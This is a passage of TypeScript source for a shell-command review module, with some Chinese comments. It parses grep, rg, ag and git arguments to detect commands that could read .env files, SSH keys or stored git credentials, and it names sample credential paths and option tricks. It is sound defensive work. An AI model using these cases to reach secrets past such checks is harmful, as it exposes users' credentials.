  if (right.kind === 'literal') return shellSelectorGlobLabelsOverlap(right, left);
  if (left.kind === 'class' && right.kind === 'class') {
    if (!left.negated && !right.negated) {
      return [...left.values].some((value) => shellSelectorClassAllows(right, value));
    }
    if (!left.negated) return [...left.values].some((value) => shellSelectorClassAllows(right, value));
    if (!right.negated) return [...right.values].some((value) => shellSelectorClassAllows(left, value));
    return true;
  }
  if (left.kind === 'class') {
    if (left.negated) return true;
    return [...left.values].some((value) => value !== '/'
      && (right.kind !== 'non-word' || !/[a-z0-9_]/i.test(value)));
  }
  if (right.kind === 'class') return shellSelectorGlobLabelsOverlap(right, left);
  return true;
}


function shellSelectorGlobsIntersect(leftPattern: string, rightPattern: string): boolean | null {
  const left = shellSelectorGlobTokens(leftPattern);
  const right = shellSelectorGlobTokens(rightPattern);
  if (!left || !right) return null;
  const pending: Array<[number, number]> = [[0, 0]];
  const visited = new Set<string>();
  while (pending.length > 0) {
    const [leftIndex, rightIndex] = pending.pop()!;
    const key = `${leftIndex}:${rightIndex}`;
    if (visited.has(key)) continue;
    visited.add(key);
    if (leftIndex === left.length && rightIndex === right.length) return true;

    const leftToken = left[leftIndex]!;
    const rightToken = right[rightIndex]!;
    if (leftToken?.kind === 'star' || leftToken?.kind === 'globstar') {
      pending.push([leftIndex + 1, rightIndex]);
    }
    if (rightToken?.kind === 'star' || rightToken?.kind === 'globstar') {
      pending.push([leftIndex, rightIndex + 1]);
    }

    const leftTransition = shellSelectorGlobTransition(left, leftIndex);
    const rightTransition = shellSelectorGlobTransition(right, rightIndex);
    if (leftTransition && rightTransition
      && shellSelectorGlobLabelsOverlap(leftTransition.label, rightTransition.label)) {
      pending.push([leftTransition.next, rightTransition.next]);
    }
  }
  return false;
}


function selectorCouldMatchCredential(value: string): boolean {
  if (value.startsWith('!')) return false;
  return braceExpansionCouldMatch(value, (candidate) =>
    SHELL_CREDENTIAL_SELECTOR_GLOBS.some((credentialGlob) => {
      if (!candidate.includes('/') && credentialGlob.endsWith('/**')) return false;
      const sensitivePattern = candidate.includes('/')
        ? credentialGlob
        : credentialGlob.replace(/\\/g, '/').split('/').pop() ?? '';
      return shellSelectorGlobsIntersect(candidate, sensitivePattern) !== false;
    }));
}


function shellOperandCouldMatchDotenv(
  value: string,
  exactMatcher: (candidate: string) => boolean = isDotenvCredentialPath,
): boolean {
  if (exactMatcher(value)) return true;
  return braceExpansionCouldMatch(value, (alternative) => {
    const basename = alternative.replace(/\\/g, '/').split('/').pop() ?? '';
    return basename.startsWith('.') && !selectorAlternativeCannotMatchDotenv(alternative);
  });
}


/**
 * 分享任务确认凭证用(CredentialCommandOptions.sourceFileSelectors)：只选中这些扩展名的搜索范围不算
 * 读取凭证。都是代码与文档；`.json`、`.yaml`、`.txt`、`.sh`、`.sql` 这类可能直接存放凭证的格式不在内。
 */
const SOURCE_FILE_SELECTOR_EXTENSIONS: ReadonlySet<string> = new Set([
  'ts', 'tsx', 'mts', 'cts', 'js', 'jsx', 'mjs', 'cjs', 'vue', 'svelte', 'astro',
  'py', 'pyi', 'rb', 'go', 'rs', 'java', 'kt', 'kts', 'scala', 'swift', 'm', 'mm',
  'c', 'h', 'cc', 'cpp', 'cxx', 'hpp', 'hh', 'cs', 'fs', 'php', 'lua', 'dart',
  'ex', 'exs', 'erl', 'hs', 'ml', 'clj', 'r', 'jl', 'zig', 'sol', 'proto', 'graphql', 'gql',
  'css', 'scss', 'sass', 'less', 'html', 'htm', 'md', 'mdx', 'rst', 'adoc',
]);


/**
 * 选择器的每个展开都以固定的源码 / 文档扩展名结尾，且扩展名前的部分去掉通配符后不像凭证：
 * `*.ts`、`src/**\/*.{ts,tsx}` 算；`.env.ts`、`server.key.ts`、`.ssh/**\/*.ts`、`*.ts*`、`*.t[s]` 不算。
 * 字面上 `*.ts` 也能选中 `.env.ts`、`id_rsa.ts`，这类名字按代码模块处理(provider-sharing.md §9 第 7 条)。
 */
function selectorOnlyMatchesSourceFiles(value: string): boolean {
  return !braceExpansionCouldMatch(value, (alternative) => {
    const normalized = alternative.replace(/\\/g, '/');
    const slash = normalized.lastIndexOf('/');
    const match = /^(.*)\.([A-Za-z0-9]+)$/.exec(normalized.slice(slash + 1));
    if (!match || !SOURCE_FILE_SELECTOR_EXTENSIONS.has(match[2]!.toLowerCase())) return true;
    const literal = (normalized.slice(0, slash + 1) + match[1]!).replace(/[*?[\]!]/g, '');
    return isSensitiveCredentialPath(literal) || isSensitiveCredentialPath(`${literal}/`);
  });
}


function shareSelectorCouldMatchCredential(value: string): boolean {
  return selectorCouldMatchCredential(value) && !selectorOnlyMatchesSourceFiles(value);
}


function readerOptionValueIsSensitive(
  kind: ReaderOptionKind,
  value: string | undefined,
  isSensitiveOperand: (value: string) => boolean,
  selectorCouldMatch: (value: string) => boolean = selectorCouldMatchCredential,
  fileReadRequiresConsent?: (value: string) => boolean,
): boolean {
  if (kind === 'selector') return selectorCouldMatch(value ?? '');
  if (!value || (kind !== 'data-file' && kind !== 'aux-file' && kind !== 'aux-file-list')) return false;
  const operands = kind === 'aux-file-list' ? value.split(/[:;]/) : [value];
  return operands.some((operand) => fileReadRequiresConsent
    ? fileReadRequiresConsent(operand)
    : isSensitiveOperand(operand) || selectorCouldMatchCredential(operand));
}


function readerArgumentsReadDotenv(
  bin: string,
  args: readonly string[],
  isSensitiveOperand: (value: string) => boolean = isDotenvCredentialPath,
  platform: NodeJS.Platform = process.platform,
  selectorCouldMatch: (value: string) => boolean = selectorCouldMatchCredential,
  fileReadRequiresConsent?: (value: string) => boolean,
  checkPositionalFiles = true,
): boolean {
  let dataArgumentProvided = !FIRST_DATA_ARGUMENT_BINS.has(bin);
  let optionsEnded = false;

  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (!optionsEnded && token === '--') {
      optionsEnded = true;
      continue;
    }

    if (!optionsEnded && token.startsWith('--')) {
      const equalsIndex = token.indexOf('=');
      const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
      const kind = resolveReaderLongOption(bin, name);
      if (kind) {
        const attached = equalsIndex >= 0 ? token.slice(equalsIndex + 1) : undefined;
        if (kind === 'named-data' || kind === 'named-file') {
          const nameValue = attached ?? args[index + 1]!;
          const secondValue = attached === undefined ? args[index + 2]! : args[index + 1]!;
          if (nameValue === undefined || secondValue === undefined) return true;
          if (kind === 'named-file'
            && readerOptionValueIsSensitive('data-file', secondValue, isSensitiveOperand,
              selectorCouldMatch, fileReadRequiresConsent)) return true;
          index += attached === undefined ? 2 : 1;
          continue;
        }
        const value = attached ?? args[index + 1]!;
        const isSensitive = readerOptionValueIsSensitive(kind, value, isSensitiveOperand,
          selectorCouldMatch, fileReadRequiresConsent);
        if (kind !== 'data' && isSensitive) return true;
        if (attached === undefined) index += 1;
        if (kind === 'data' || kind === 'data-file') dataArgumentProvided = true;
        continue;
      }
    }

    if (!optionsEnded && /^-[^-]/.test(token)) {
      let handled = false;
      for (let optionIndex = 1; optionIndex < token.length; optionIndex += 1) {
        const kind = readerShortOptionKind(bin, token.charAt(optionIndex), platform);
        if (!kind) continue;
        const attached = token.slice(optionIndex + 1) || undefined;
        const value = attached ?? args[index + 1]!;
        const isSensitive = readerOptionValueIsSensitive(kind, value, isSensitiveOperand,
          selectorCouldMatch, fileReadRequiresConsent);
        if (kind !== 'data' && isSensitive) return true;
        if (attached === undefined) index += 1;
        if (kind === 'data' || kind === 'data-file') dataArgumentProvided = true;
        handled = true;
        break; // getopt: the first value-taking option consumes the rest of the cluster.
      }
      if (handled) continue;
      if (token.startsWith('-')) continue;
    }

    if (!dataArgumentProvided) {
      dataArgumentProvided = true;
      continue;
    }
    if (fileReadRequiresConsent && checkPositionalFiles
      ? fileReadRequiresConsent(token)
      : shellOperandCouldMatchDotenv(token, isSensitiveOperand)) return true;
  }
  return false;
}


function grepRecursesIntoPotentialDotenv(
  bin: string,
  args: readonly string[],
  selectorCouldMatch: (value: string) => boolean = selectorCouldMatchCredential,
): boolean {
  if (bin !== 'grep' && bin !== 'egrep' && bin !== 'fgrep') return false;

  const longOptionNames = [
    '--recursive', '--directories', ...GREP_LONG_OPTIONS.map((option) => option.name),
  ];
  let recursive = false;
  const includes: string[] = [];

  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') break;

    if (token.startsWith('--')) {
      const equalsIndex = token.indexOf('=');
      const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
      const exact = longOptionNames.find((option) => option === name);
      const matches = exact ? [exact] : longOptionNames.filter((option) => option.startsWith(name));
      const canonical = matches.length === 1 ? matches[0]! : null;
      if (!canonical) continue;

      if (canonical === '--recursive') {
        recursive = true;
        continue;
      }

      const attached = equalsIndex >= 0 ? token.slice(equalsIndex + 1) : undefined;
      const value = attached ?? args[index + 1]!;
      if (attached === undefined) index += 1;
      if (canonical === '--directories') {
        recursive = Boolean(value && 'recurse'.startsWith(value));
      }
      if (canonical === '--include' && value) includes.push(value);
      continue;
    }

    if (/^-[^-]/.test(token)) {
      for (let optionIndex = 1; optionIndex < token.length; optionIndex += 1) {
        const option = token.charAt(optionIndex);
        if (option === 'r' || option === 'R') {
          recursive = true;
          continue;
        }
        if (option === 'd') {
          const attached = token.slice(optionIndex + 1) || undefined;
          const value = attached ?? args[index + 1]!;
          if (attached === undefined) index += 1;
          recursive = Boolean(value && 'recurse'.startsWith(value));
          break;
        }
        if (readerShortOptionKind('grep', option)) {
          if (optionIndex === token.length - 1) index += 1;
          break;
        }
      }
    }
  }

  return recursive && (includes.length === 0 || includes.some(selectorCouldMatch));
}


type RgTypeDefinition = { globs: string[]; includes: string[] };


type ParsedRgTypeSpec = {
  name: string;
  glob?: string;
  includes?: string[];
};


function parseRgTypeSpec(value: string): ParsedRgTypeSpec | null {
  const separator = value.indexOf(':');
  if (separator <= 0 || separator === value.length - 1) return null;
  const name = value.slice(0, separator);
  if (!/^[\p{L}\p{N}]+$/u.test(name)) return null;
  const definition = value.slice(separator + 1);
  if (!definition.startsWith('include:')) return { name, glob: definition };
  const includes = definition.slice('include:'.length).split(',');
  return includes.length > 0 && includes.every((included) => /^[\p{L}\p{N}]+$/u.test(included))
    ? { name, includes }
    : null;
}


function rgCustomTypeCouldMatchCredential(
  name: string,
  definitions: ReadonlyMap<string, RgTypeDefinition>,
  selectorCouldMatch: (value: string) => boolean,
  visiting = new Set<string>(),
): boolean {
  if (visiting.has(name)) return true;
  const definition = definitions.get(name);
  if (!definition) return true;
  if (definition.globs.some(selectorCouldMatch)) return true;
  const nextVisiting = new Set(visiting).add(name);
  return definition.includes.some((included) =>
    rgCustomTypeCouldMatchCredential(included, definitions, selectorCouldMatch, nextVisiting));
}


type AgScopeOptionKind =
  | 'hidden'
  | 'recursive'
  | 'non-recursive'
  | 'value'
  | 'optional-value'
  | 'filename-only'
  | 'flag';


const AG_SCOPE_LONG_OPTIONS: ReadonlyArray<{ name: string; kind: AgScopeOptionKind }> = [
  { name: '--ackmate-dir-filter', kind: 'value' },
  { name: '--after', kind: 'optional-value' },
  { name: '--before', kind: 'optional-value' },
  { name: '--color-line-number', kind: 'value' },
  { name: '--color-match', kind: 'value' },
  { name: '--color-path', kind: 'value' },
  { name: '--context', kind: 'optional-value' },
  { name: '--depth', kind: 'value' },
  { name: '--filename-pattern', kind: 'filename-only' },
  { name: '--file-search-regex', kind: 'value' },
  { name: '--heading', kind: 'flag' },
  { name: '--help', kind: 'flag' },
  { name: '--hidden', kind: 'hidden' },
  { name: '--ignore', kind: 'value' },
  { name: '--ignore-case', kind: 'flag' },
  { name: '--ignore-dir', kind: 'value' },
  { name: '--max-count', kind: 'value' },
  { name: '--no-recurse', kind: 'non-recursive' },
  { name: '--norecurse', kind: 'non-recursive' },
  { name: '--pager', kind: 'value' },
  { name: '--path-to-ignore', kind: 'value' },
  { name: '--recurse', kind: 'recursive' },
  { name: '--unrestricted', kind: 'hidden' },
  { name: '--width', kind: 'value' },
  { name: '--workers', kind: 'value' },
];

const AG_VALUE_SHORT_OPTIONS: ReadonlySet<string> = new Set(['A', 'B', 'C', 'G', 'm', 'p', 'W']);


function agSearchesPotentialCredential(args: readonly string[]): boolean {
  let hidden = false;
  let recursive = true;
  let filenameOnly = false;

  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') break;

    if (token.startsWith('--')) {
      const equalsIndex = token.indexOf('=');
      const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
      const exact = AG_SCOPE_LONG_OPTIONS.find((option) => option.name === name);
      const matches = exact
        ? [exact]
        : AG_SCOPE_LONG_OPTIONS.filter((option) => option.name.startsWith(name));
      const option = matches.length === 1 ? matches[0]! : null;
      if (!option) continue;
      if (option.kind === 'hidden') hidden = true;
      if (option.kind === 'recursive') recursive = true;
      if (option.kind === 'non-recursive') recursive = false;
      if (option.kind === 'filename-only') filenameOnly = true;
      if ((option.kind === 'value' || option.kind === 'filename-only') && equalsIndex < 0) index += 1;
      continue;
    }

    if (!/^-[^-]/.test(token)) continue;
    for (let optionIndex = 1; optionIndex < token.length; optionIndex += 1) {
      const option = token.charAt(optionIndex);
      if (option === 'u') hidden = true;
      if (option === 'n') recursive = false;
      if (option === 'r' || option === 'R') recursive = true;
      if (option === 'g') filenameOnly = true;
      if (option !== 'g' && !AG_VALUE_SHORT_OPTIONS.has(option)) continue;
      if (optionIndex === token.length - 1) index += 1;
      break;
    }
  }

  // Explicit ignore patterns only subtract candidates and cannot prove that the
  // complete credential language is excluded. Unrestricted mode ignores them.
  return hidden && recursive && !filenameOnly;
}


function searchFollowsSymlinks(bin: string, args: readonly string[]): boolean {
  for (const token of args) {
    if (token === '--') break;
    if (bin === 'rg' && (token === '--follow' || /^-[^-]*L/.test(token))) return true;
    if (bin === 'ag' && (token === '--follow' || /^-[^-]*f/.test(token))) return true;
    if (bin === 'grep' || bin === 'egrep' || bin === 'fgrep') {
      if (/^-[^-]*R/.test(token)) return true;
      const name = token.split('=')[0]!;
      if (name.startsWith('--') && '--dereference-recursive'.startsWith(name)) return true;
    }
  }
  return false;
}


function ripgrepMayRunPreprocessor(args: readonly string[]): boolean {
  return args.some((token) => {
    const name = token.split('=', 1)[0]!;
    return name.length > 2 && '--pre'.startsWith(name);
  });
}


function rgSearchesPotentialDotenv(
  args: readonly string[],
  selectorCouldMatch: (value: string) => boolean = selectorCouldMatchCredential,
): boolean {
  let hidden = false;
  let unrestricted = 0;
  let typeParsingUnresolved = false;
  const globs: string[] = [];
  const definitions = new Map<string, RgTypeDefinition>();
  let allTypesIncluded = false;
  const typeSelections = new Map<string, boolean>();
  const applyTypeOption = (kind: ReaderOptionKind, value: string | undefined): void => {
    if (!value) {
      typeParsingUnresolved = true;
      return;
    }
    if (kind === 'type-include' || kind === 'type-exclude') {
      const included = kind === 'type-include';
      if (value === 'all') {
        allTypesIncluded = included;
        typeSelections.clear();
      } else if (!/^[\p{L}\p{N}]+$/u.test(value)) {
        typeParsingUnresolved = true;
      } else {
        typeSelections.set(value, included);
      }
      return;
    }
    if (kind === 'type-clear') {
      if (!/^[\p{L}\p{N}]+$/u.test(value)) typeParsingUnresolved = true;
      else definitions.set(value, { globs: [], includes: [] });
      return;
    }
    if (kind !== 'type-definition') return;
    const parsed = parseRgTypeSpec(value);
    if (!parsed) {
      typeParsingUnresolved = true;
      return;
    }
    const definition = definitions.get(parsed.name) ?? { globs: [], includes: [] };
    if (parsed.glob !== undefined) definition.globs.push(parsed.glob);
    if (parsed.includes !== undefined) definition.includes.push(...parsed.includes);
    definitions.set(parsed.name, definition);
  };

  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') break;
    if (token === '--hidden') { hidden = true; continue; }
    if (token === '--no-hidden') { hidden = false; continue; }
    if (token.startsWith('--')) {
      const equalsIndex = token.indexOf('=');
      const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
      const kind = resolveReaderLongOption('rg', name);
      if (!kind) continue;
      const attached = equalsIndex >= 0 ? token.slice(equalsIndex + 1) : undefined;
      const value = attached ?? args[index + 1]!;
      if (attached === undefined) index += 1;
      if (kind === 'selector' && value) globs.push(value);
      applyTypeOption(kind, value);
      continue;
    }
    if (!/^-[^-]/.test(token)) continue;
    for (let optionIndex = 1; optionIndex < token.length; optionIndex += 1) {
      const option = token.charAt(optionIndex);
      if (option === '.') { hidden = true; continue; }
      if (option === 'u') { unrestricted += 1; if (unrestricted >= 2) hidden = true; continue; }
      const kind = readerShortOptionKind('rg', option);
      if (!kind) continue;
      const attached = token.slice(optionIndex + 1) || undefined;
      const value = attached ?? args[index + 1]!;
      if (attached === undefined) index += 1;
      if (kind === 'selector' && value) globs.push(value);
      applyTypeOption(kind, value);
      break;
    }
  }

  if (typeParsingUnresolved) return true;
  const selectedCustomTypes = [...definitions.keys()].filter((name) =>
    typeSelections.get(name) ?? allTypesIncluded);
  if (selectedCustomTypes.some((name) =>
    rgCustomTypeCouldMatchCredential(name, definitions, selectorCouldMatch))) return true;

  const positive = globs.filter((glob) => !glob.startsWith('!'));
  const positiveCouldMatchCredential = positive.some(selectorCouldMatch);
  const positiveIsSafe = positive.length > 0 && !positiveCouldMatchCredential;
  return hidden && !positiveIsSafe;
}


function gitGrepExpandsSearchScope(args: readonly string[]): boolean {
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') return false;

    if (token.startsWith('--')) {
      const equalsIndex = token.indexOf('=');
      const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
      if ('--untracked'.startsWith(name) || '--no-index'.startsWith(name)) return true;

      const kind = resolveReaderLongOption('grep', name);
      if (kind && equalsIndex < 0) index += 1;
      continue;
    }

    if (/^-[^-]/.test(token)) {
      for (let optionIndex = 1; optionIndex < token.length; optionIndex += 1) {
        const kind = readerShortOptionKind('grep', token.charAt(optionIndex));
        if (!kind) continue;
        if (optionIndex === token.length - 1) index += 1;
        break;
      }
    }
  }
  return false;
}


function isGitDotenvOperand(value: string): boolean {
  if (isDotenvCredentialPath(value)) return true;
  if (value.startsWith('-')) return false;

  const longPathspec = /^:\(([^)]*)\)(.+)$/.exec(value);
  if (longPathspec) {
    if (/(?:^|,)(?:exclude|!)(?:,|$)/.test(longPathspec[1]!)) return false;
    return selectorCouldMatchDotenv(longPathspec[2]!);
  }
  if (value.startsWith(':/')) return selectorCouldMatchDotenv(value.slice(2));
  if (value.startsWith(':!') || value.startsWith(':^')) return false;

  const indexPath = /^:(?:[0-3]:)?(.+)$/.exec(value);
  return Boolean(indexPath && isDotenvCredentialPath(indexPath[1]!));
}


function isGitRevisionDotenvOperand(value: string): boolean {
  if (value.startsWith('-')) return false;
  const revisionPathSeparator = value.indexOf(':');
  return revisionPathSeparator > 0
    && isDotenvCredentialPath(value.slice(revisionPathSeparator + 1));
}


function isGitExcludePathspec(value: string): boolean {
  const longPathspec = /^:\(([^)]*)\)(.*)$/.exec(value);
  if (longPathspec) return /(?:^|,)(?:exclude|!)(?:,|$)/.test(longPathspec[1]!);
  return value.startsWith(':!') || value.startsWith(':^');
}


function gitBlameContentsReadDotenv(
  args: readonly string[],
  fileReadRequiresConsent: (value: string) => boolean = shellOperandCouldMatchDotenv,
): boolean {
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') break;
    if (!token.startsWith('--')) continue;
    const equalsIndex = token.indexOf('=');
    const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
    const isContentsOption = name === '--contents'
      || (name.length >= '--cont'.length && '--contents'.startsWith(name));
    if (!isContentsOption) continue;
    const attached = equalsIndex >= 0 ? token.slice(equalsIndex + 1) : undefined;
    const value = attached ?? args[index + 1]!;
    if (value && fileReadRequiresConsent(value)) return true;
    if (attached === undefined) index += 1;
  }
  return false;
}


/**
 * `-L` uses `<range>:<file>`: regex ranges may contain colons inside `/.../`, while
 * function ranges begin with `:` and use the next unescaped colon as the separator.
 */
function gitLineRangeFile(value: string): string | null {
  let escaped = false;
  if (value.startsWith(':')) {
    for (let index = 1; index < value.length; index += 1) {
      const char = value.charAt(index);
      if (escaped) { escaped = false; continue; }
      if (char === '\\') { escaped = true; continue; }
      if (char === ':') return value.slice(index + 1);
    }
    return null;
  }

  let inRegex = false;
  for (let index = 0; index < value.length; index += 1) {
    const char = value.charAt(index);
    if (escaped) { escaped = false; continue; }
    if (char === '\\') { escaped = true; continue; }
    if (char === '/') { inRegex = !inRegex; continue; }
    if (char === ':' && !inRegex) return value.slice(index + 1);
  }
  return null;
}


function gitLineRangeReadsDotenv(args: readonly string[]): boolean {
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') break;
    let value: string | undefined;
    if (token === '-L') {
      value = args[index + 1]!;
      index += 1;
    } else if (token.startsWith('-L')) {
      value = token.slice(2);
    } else {
      continue;
    }
    if (!value) return true;
    const file = gitLineRangeFile(value);
    if (file === null || shellOperandCouldMatchDotenv(file, isGitDotenvOperand)) return true;
  }
  return false;
}


function gitArgumentsReadDotenv(args: readonly string[]): boolean {
  let pathspecOnly = false;
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') {
      pathspecOnly = true;
      continue;
    }
    if (!pathspecOnly && (token === '--format' || token === '--pretty')) {
      index += 1;
      continue;
    }
    if (isGitExcludePathspec(token)) continue;
    if (shellOperandCouldMatchDotenv(token, isGitDotenvOperand)) return true;
    if (!pathspecOnly && isGitRevisionDotenvOperand(token)) return true;
  }
  return false;
}


type GitGrepOutputMode = 'content' | 'files-only';


const GIT_GREP_OUTPUT_OPTIONS: readonly { name: string; mode: GitGrepOutputMode }[] = [
  { name: '--files-with-matches', mode: 'files-only' },
  { name: '--files-without-match', mode: 'files-only' },
  { name: '--name-only', mode: 'files-only' },
  { name: '--no-files-with-matches', mode: 'content' },
  { name: '--no-files-without-match', mode: 'content' },
  { name: '--no-name-only', mode: 'content' },
];


function resolveGitGrepOutputMode(name: string): GitGrepOutputMode | null {
  const exact = GIT_GREP_OUTPUT_OPTIONS.find((option) => option.name === name);
  if (exact) return exact.mode;
  const modes = new Set(
    GIT_GREP_OUTPUT_OPTIONS
      .filter((option) => option.name.startsWith(name))
      .map((option) => option.mode),
  );
  return modes.size === 1 ? [...modes][0]! ?? null : null;
}


function gitGrepListsOnly(args: readonly string[]): boolean {
  let outputMode: GitGrepOutputMode = 'content';
  for (let tokenIndex = 0; tokenIndex < args.length; tokenIndex += 1) {
    const token = args[tokenIndex]!;
    if (token === '--') break;
    if (token.startsWith('--')) {
      const equalsIndex = token.indexOf('=');
      const name = equalsIndex >= 0 ? token.slice(0, equalsIndex) : token;
      const kind = resolveReaderLongOption('grep', name);
      if (kind === 'data' || kind === 'data-file') {
        if (equalsIndex < 0) tokenIndex += 1;
        continue;
      }
      outputMode = resolveGitGrepOutputMode(name) ?? outputMode;
      continue;
    }
    if (!/^-[^-]/.test(token)) continue;
    for (let optionIndex = 1; optionIndex < token.length; optionIndex += 1) {
      const option = token.charAt(optionIndex);
      if (option === 'e' || option === 'f') {
        if (optionIndex === token.length - 1) tokenIndex += 1;
        break;
      }
      if (option === 'l' || option === 'L') outputMode = 'files-only';
    }
  }
  return outputMode === 'files-only';
}


const GIT_METADATA_ONLY_FLAGS = [
  '--stat', '--shortstat', '--numstat', '--name-only', '--name-status', '--summary', '--check', '--raw',
] as const;


function gitPatchRequested(args: readonly string[]): boolean {
  return args.some((arg) =>
    /^(?:-p|--patch|-u|-U\d*|--unified(?:=.*)?|-W|-c|--cc|--function-context|--word-diff(?:=.*)?|--word-diff-regex(?:=.*)?|--color-words(?:=.*)?|--patch-with-stat|--patch-with-raw|--binary|--inter-hunk-context(?:=.*)?)$/.test(arg));
}


function gitMetadataOnlyRequested(args: readonly string[]): boolean {
  return args.some((arg) => GIT_METADATA_ONLY_FLAGS.includes(arg as typeof GIT_METADATA_ONLY_FLAGS[number]));
}


function isSafeGitObjectPath(value: string): boolean {
  if (value.startsWith(':(') || value.startsWith(':!') || value.startsWith(':^') || value.startsWith(':/')) return false;
  const indexPath = /^:(?:[0-3]:)?(.+)$/.exec(value);
  if (indexPath) return !isDotenvCredentialPath(indexPath[1]!);
  const separator = value.indexOf(':');
  if (separator <= 0) return false;
  const revision = value.slice(0, separator);
  const objectPath = value.slice(separator + 1);
  return /^[A-Za-z0-9_./@{}~^+\-]+$/.test(revision)
    && Boolean(objectPath)
    && !isDotenvCredentialPath(objectPath);
}


function gitShowHasOnlySafeObjectPaths(args: readonly string[]): boolean {
  let sawObjectPath = false;
  for (let index = 0; index < args.length; index += 1) {
    const token = args[index]!;
    if (token === '--') return false;
    if (token === '--format' || token === '--pretty') {
      index += 1;
      continue;
    }
    if (token.startsWith('-')) continue;
    if (!isSafeGitObjectPath(token)) return false;
    sawObjectPath = true;
  }
  return sawObjectPath;
}


function gitCatFileReadsUnscopedContent(args: readonly string[]): boolean {
  if (args.includes('--batch-check') || args.some((arg) => arg.startsWith('--batch-check='))) return false;
  if (args.some((arg) => arg === '--batch' || arg.startsWith('--batch=') || arg === '--batch-command' || arg.startsWith('--batch-command='))) return true;

  let contentMode = args.includes('-p');
  let objectArgs = args.filter((arg) => !arg.startsWith('-'));
  if (objectArgs[0]! === 'blob') {
    contentMode = true;
    objectArgs = objectArgs.slice(1);
  } else if (objectArgs[0]! === 'tree' || objectArgs[0]! === 'commit' || objectArgs[0]! === 'tag') {
    return false;
  }
  return contentMode && !objectArgs.some(isSafeGitObjectPath);
}


// Git parse-options accepts unique long-option prefixes. Keep the complete status option
// set here so ambiguous prefixes such as `--s` do not resolve to one arbitrary candidate.
const GIT_STATUS_LONG_OPTIONS = [
  '--verbose', '--short', '--branch', '--show-stash', '--ahead-behind', '--porcelain', '--long',
  '--null', '--untracked-files', '--ignored', '--ignore-submodules', '--column', '--renames',
  '--find-renames',
] as const;


function resolveGitStatusLongOption(name: string): typeof GIT_STATUS_LONG_OPTIONS[number] | null {
  const exact = GIT_STATUS_LONG_OPTIONS.find((option) => option === name);
  if (exact) return exact;
  const matches = GIT_STATUS_LONG_OPTIONS.filter((option) => option.startsWith(name));
  return matches.length === 1 ? matches[0]! ?? null : null;
}


function gitStatusRequestsVerbose(args: readonly string[]): boolean {
  for (const token of args) {
    if (token === '--') break;
    if (/^-[^-]*v/.test(token)) return true;
    if (!token.startsWith('--') || token.includes('=') || token.startsWith('--no-')) continue;
    if (resolveGitStatusLongOption(token) === '--verbose') return true;
  }
  return false;
}


function gitContentReadWithoutPath(sub: string, args: readonly string[]): boolean {
  if (sub === 'grep') return !gitGrepListsOnly(args);
  if (sub === 'diff') return !gitMetadataOnlyRequested(args) || gitPatchRequested(args);
  if (sub === 'show') {
    if (gitShowHasOnlySafeObjectPaths(args)) return false;
    const patchSuppressed = args.includes('-s') || args.includes('--no-patch') || gitMetadataOnlyRequested(args);
    return !patchSuppressed || gitPatchRequested(args);
  }
  if (sub === 'log' || sub === 'whatchanged') return gitPatchRequested(args);
  if (sub === 'cat-file') return gitCatFileReadsUnscopedContent(args);
  if (sub === 'status') return gitStatusRequestsVerbose(args);
  return false;
}


/**
 * 各段命令实际运行的目录(认不出时为 undefined)：跟随前面各段的 cd / pushd，规则同 scopedDestructionNeedsConsent。
 * 出现括号(子 shell、命令组)后，后续各段的目录按认不出处理。
 */
function segmentWorkingDirs(
  segments: readonly ExecutableSegment[],
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): Array<string | undefined> {
  let cwd: string | undefined = opts.cwd ?? workspaceRoots[0]!;
  let cwdUnknown = opts.cwdUnknown === true;
  return segments.map(({ text, separatorAfter }) => {
    const unwrapped = unwrapCommand(stripShellControlTokens(tokenize(text)), cwd, cwdUnknown);
    const here = unwrapped.cwdUnknown ? undefined : unwrapped.cwd;
    const change = directoryChangeTarget(unwrapped.tokens);
    if (/[(){}]/.test(text) || (change.changesDirectory && separatorAfter === 'or')) {
      cwd = undefined;
      cwdUnknown = true;
    } else if (change.changesDirectory && separatorAfter !== 'pipe' && separatorAfter !== 'background') {
      const next = resolveCwdTarget(change.target, unwrapped.cwd, unwrapped.cwdUnknown);
      cwd = next.cwd;
      cwdUnknown = next.cwdUnknown;
    }
    return here;
  });
}


/** git 的 -C 叠加在所在目录上(parseGitInvocation 已核对过全局选项)。 */
function gitInvocationCwd(tokens: readonly string[], cwd: string | undefined): string | undefined {
  for (let index = 1; index < tokens.length && cwd !== undefined; index += 1) {
    const token = tokens[index]!;
    if (token === '--' || !token.startsWith('-')) break;
    if (token === '--namespace') {
      index += 1;
      continue;
    }
    const attached = /^-C=?(.+)$/.exec(token);
    if (token !== '-C' && !attached) continue;
    const target = attached ? attached[1]! : tokens[index + 1]!;
    if (!attached) index += 1;
    const next = resolveCwdTarget(target, cwd);
    cwd = next.cwdUnknown ? undefined : next.cwd;
  }
  return cwd;
}


/** 带独立取值的 git 全局选项(只用于在 parseGitInvocation 认不出时粗找子命令)。 */
const GIT_GLOBAL_VALUE_OPTIONS: ReadonlySet<string> = new Set([
  '-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env', '--super-prefix',
]);

/** 读取 git config 的选项与子命令；其余写配置的选项与子命令见 GIT_CONFIG_WRITES。 */
const GIT_CONFIG_READS = /^(?:--get(?:-all|-regexp|-urlmatch)?|--list|-l|list|get)$/;

const GIT_CONFIG_WRITES: ReadonlySet<string> = new Set([
  '--unset', '--unset-all', '--add', '--replace-all', '--rename-section', '--remove-section', '-e', '--edit',
  'set', 'unset', 'rename-section', 'remove-section', 'edit',
]);


/**
 * 会打出 git 配置(远程地址、http 头等)或保存的凭证：git credential 与 credential-* 助手、git remote -v /
 * get-url / show、读 git config、git var -l。
 */
function gitPrintsConfig(sub: string, args: readonly string[]): boolean {
